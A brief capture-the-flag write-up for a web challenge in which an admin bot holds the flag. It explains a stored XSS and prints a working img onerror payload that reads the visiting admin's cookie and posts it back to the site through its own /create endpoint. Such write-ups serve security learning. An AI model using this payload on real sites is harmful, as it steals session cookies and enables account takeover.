<font size = '4'>
<p align = 'center'>
<b>
Break the Syntax CTS - Flag Report Writeup 
</b>
</p>
</font>

<br>
<font size = '3'>

<b>Challenge Description:</b><br>

I heard the admin has the flag.

Maybe he will give it to you if you ask nicely.

disclaimer: challenge does not have internet access

<br>

<b>Exploitation:</b><br>

There is an XSS vulnerability. A new post is created to exploit this.

```html
<img src=x onerror='fetch("/create", { method: "POST", body: new URLSearchParams({ title: "flag", body: "flag: " + document.cookie }) });'>
```
This post is then reported so that the admin bot visits it. This will trigger the URL, create a new post with the cookie.